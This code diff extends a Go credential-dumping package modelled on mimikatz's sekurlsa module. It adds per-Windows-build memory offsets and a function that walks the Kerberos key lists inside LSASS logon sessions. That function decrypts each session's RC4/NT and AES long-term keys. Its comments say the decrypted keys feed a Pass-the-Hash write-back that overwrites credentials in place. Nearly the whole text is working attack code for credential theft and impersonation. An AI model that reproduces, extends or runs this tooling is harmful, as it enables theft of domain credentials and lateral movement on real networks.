@@ -3,6 +3,7 @@ package sekurlsa
 import (
 	"encoding/binary"
 	"fmt"
+	"strings"
 )
 
 // KerberosLayout captures every offset the Kerberos walker needs to
@@ -53,6 +54,78 @@ type KerberosLayout struct {
 	TicketNodeSize uint32
 }
 
+// KerberosPrimaryCredentialLayout describes the per-build offsets
+// for the inline KIWI_KERBEROS_10_PRIMARY_CREDENTIAL[_1607] inside
+// the session node and the flat KERB_HASHPASSWORD_* array hanging
+// off `pKeyList` (a KIWI_KERBEROS_KEYS_LIST_6 header followed by
+// `cbItem` entries). Set HashEntrySize=0 to disable per-etype hash
+// extraction.
+//
+// Build coverage (x64, sourced from agent research mining mimikatz
+// + pypykatz + KvcForensic):
+//
+//   - 1507/1511 (`_10` + `_6`):  PKeyListOffset=0x108
+//                                HashEntrySize=48
+//                                HashGenericOffset=0x18
+//                                KeysListHeaderSize=24
+//   - 1607–22H2 + Win11 21H2/22H2/23H2 (`_10_1607` + `_6_1607`):
+//                                PKeyListOffset=0x118
+//                                HashEntrySize=56
+//                                HashGenericOffset=0x20
+//                                KeysListHeaderSize=40
+//   - Win11 24H2 (`_24H2` + `_6_1607`):
+//                                PKeyListOffset=0x0F8 (unk13 dropped)
+//                                HashEntrySize=56
+//                                HashGenericOffset=0x20
+//                                KeysListHeaderSize=40
+type KerberosPrimaryCredentialLayout struct {
+	// PKeyListOffset — PVOID inside the KIWI_KERBEROS_LOGON_SESSION
+	// node pointing at a KIWI_KERBEROS_KEYS_LIST_6 header.
+	PKeyListOffset uint32
+
+	// KeysListHeaderSize — number of bytes between the start of
+	// KIWI_KERBEROS_KEYS_LIST_6 and its first KERB_HASHPASSWORD
+	// entry. 24 for `_5` (pre-Win10), 40 for `_6` (Win10+).
+	KeysListHeaderSize uint32
+
+	// KeysListCbItemOffset — uint32 cbItem field inside the keys-
+	// list header. Stable at 0x04 across builds.
+	KeysListCbItemOffset uint32
+
+	// HashEntrySize — total size of one KERB_HASHPASSWORD_* entry
+	// in the flat array. 40 for `_5`, 48 for `_6`, 56 for
+	// `_6_1607`.
+	HashEntrySize uint32
+
+	// HashGenericOffset — offset of the embedded
+	// KERB_HASHPASSWORD_GENERIC inside one entry. 0x10/0x18/0x20
+	// per the trio above.
+	HashGenericOffset uint32
+
+	// GenericTypeOffset — uint32 etype (RC4=23, AES128=17,
+	// AES256=18, DES=1/3) inside the GENERIC. Stable at 0x00.
+	GenericTypeOffset uint32
+
+	// GenericSizeOffset — uintptr size of the cipher buffer.
+	// Stable at 0x08.
+	GenericSizeOffset uint32
+
+	// GenericChecksumPtrOff — pointer to the encrypted hash bytes
+	// in source-process VA. Stable at 0x10.
+	GenericChecksumPtrOff uint32
+}
+
+// KerberosHashEntry is one decoded per-etype hash from a session's
+// pKeyList. Plaintext is the decrypted hash bytes (16 for
+// NT/AES128, 32 for AES256). CipherVA + CipherLen feed the Pass-
+// the-Hash write-back at pth_windows.go.
+type KerberosHashEntry struct {
+	Etype     uint32
+	CipherVA  uint64
+	CipherLen uint32
+	Plaintext []byte
+}
+
 // KerberosTicket is one entry from a session's ticket cache. Buffer
 // is the ASN.1-encoded ticket bytes — feed them to a downstream
 // Kerberos parser (e.g., impacket / Rubeus / pypykatz's `kerberos
@@ -77,7 +150,17 @@ type KerberosCredential struct {
 	LogonDomain string
 	Password    string
 	Tickets     []KerberosTicket
-	Found       bool
+
+	// Hashes carries the per-etype long-term keys decoded from the
+	// session's KIWI_KERBEROS_KEYS_LIST_6 array (when the build's
+	// Template registers a non-zero KerberosPrimaryCredLayout).
+	// Populated by walkKerberosHashes; consumed by the PTH write-
+	// back at credentials/sekurlsa/pth_windows.go to overwrite the
+	// per-etype cipher bytes in place. Empty on builds with no
+	// registered layout.
+	Hashes []KerberosHashEntry
+
+	Found bool
 }
 
 // AuthPackage satisfies the Credential interface.
@@ -259,14 +342,102 @@ func decodeKerberosSession(r *reader, node []byte, t *Template, lsaKey *lsaKey) 
 		tickets = append(tickets, walkKerberosTickets(r, flink, l)...)
 	}
 
+	// Walk per-etype hash entries (chantier II.5 — feeds the
+	// PTH-Kerberos write-back). Disabled when the build's Template
+	// has not registered a KerberosPrimaryCredLayout
+	// (HashEntrySize == 0).
+	hashes, hashWarns := walkKerberosHashes(r, 0, node, t.KerberosPrimaryCredLayout, lsaKey)
+	warn := ""
+	if len(hashWarns) > 0 {
+		warn = strings.Join(hashWarns, "; ")
+	}
+
 	cred := KerberosCredential{
 		UserName:    username,
 		LogonDomain: domain,
 		Password:    password,
 		Tickets:     tickets,
-		Found:       username != "" || password != "" || len(tickets) > 0,
+		Hashes:      hashes,
+		Found:       username != "" || password != "" || len(tickets) > 0 || len(hashes) > 0,
 	}
-	return cred, luid, ""
+	return cred, luid, warn
+}
+
+// walkKerberosHashes reads the per-LUID KIWI_KERBEROS_KEYS_LIST_6
+// header at sessionNode+pkl.PKeyListOffset and walks the
+// `cbItem`-long flat array of KERB_HASHPASSWORD_* entries that
+// follows. Each entry's GENERIC sub-struct yields the etype +
+// cipher VA + cipher length we need for the Pass-the-Hash write-
+// back. The cipher is decrypted with the same lsasrv 3DES/AES key
+// chain as MSV — no Kerberos-specific KDF.
+//
+// Returns nil + warning when the layout is disabled (HashEntrySize
+// == 0) or the keys-list pointer is null. A successful walk yields
+// one entry per registered etype; entries with zero-length ciphers
+// are dropped silently. Caller-side write-back keys off the etype
+// to pick the right operator-supplied target hash.
+//
+// Sanity caps: cbItem > 32 is treated as junk and the walk aborts.
+func walkKerberosHashes(r *reader, sessionVA uint64, sessionNode []byte, pkl KerberosPrimaryCredentialLayout, lsaKey *lsaKey) ([]KerberosHashEntry, []string) {
+	if pkl.HashEntrySize == 0 {
+		return nil, nil
+	}
+	if uint32(len(sessionNode)) < pkl.PKeyListOffset+8 {
+		return nil, []string{fmt.Sprintf("Kerberos: session node too small for pKeyList @0x%X (len=%d)",
+			pkl.PKeyListOffset, len(sessionNode))}
+	}
+	pKeyList := binary.LittleEndian.Uint64(
+		sessionNode[pkl.PKeyListOffset : pkl.PKeyListOffset+8])
+	if pKeyList == 0 {
+		return nil, nil
+	}
+	hdr, err := r.ReadVA(pKeyList, int(pkl.KeysListHeaderSize))
+	if err != nil {
+		return nil, []string{fmt.Sprintf("Kerberos: read keys-list header @0x%X: %v", pKeyList, err)}
+	}
+	if uint32(len(hdr)) < pkl.KeysListCbItemOffset+4 {
+		return nil, []string{fmt.Sprintf("Kerberos: keys-list header @0x%X shorter than cbItem offset", pKeyList)}
+	}
+	cbItem := binary.LittleEndian.Uint32(
+		hdr[pkl.KeysListCbItemOffset : pkl.KeysListCbItemOffset+4])
+	if cbItem == 0 || cbItem > 32 {
+		return nil, nil
+	}
+	out := make([]KerberosHashEntry, 0, cbItem)
+	var warnings []string
+	for i := uint32(0); i < cbItem; i++ {
+		entryVA := pKeyList + uint64(pkl.KeysListHeaderSize) + uint64(i)*uint64(pkl.HashEntrySize)
+		genVA := entryVA + uint64(pkl.HashGenericOffset)
+		gen, err := r.ReadVA(genVA, 24) // KERB_HASHPASSWORD_GENERIC is fixed 24 bytes
+		if err != nil {
+			warnings = append(warnings, fmt.Sprintf("Kerberos: read GENERIC @0x%X: %v", genVA, err))
+			continue
+		}
+		etype := binary.LittleEndian.Uint32(gen[pkl.GenericTypeOffset : pkl.GenericTypeOffset+4])
+		size := binary.LittleEndian.Uint64(gen[pkl.GenericSizeOffset : pkl.GenericSizeOffset+8])
+		cipherVA := binary.LittleEndian.Uint64(gen[pkl.GenericChecksumPtrOff : pkl.GenericChecksumPtrOff+8])
+		if size == 0 || size > 64 || cipherVA == 0 {
+			continue
+		}
+		cipher, err := r.ReadVA(cipherVA, int(size))
+		if err != nil {
+			warnings = append(warnings, fmt.Sprintf("Kerberos: read cipher @0x%X (etype %d): %v", cipherVA, etype, err))
+			continue
+		}
+		plain, err := decryptLSA(cipher, lsaKey)
+		if err != nil {
+			warnings = append(warnings, fmt.Sprintf("Kerberos: decrypt cipher @0x%X (etype %d): %v", cipherVA, etype, err))
+			continue
+		}
+		out = append(out, KerberosHashEntry{
+			Etype:     etype,
+			CipherVA:  cipherVA,
+			CipherLen: uint32(size),
+			Plaintext: plain,
+		})
+	}
+	_ = sessionVA // reserved for future use (PTH-side debug)
+	return out, warnings
 }
 
 // walkKerberosTickets follows a ticket cache's Flink chain and reads
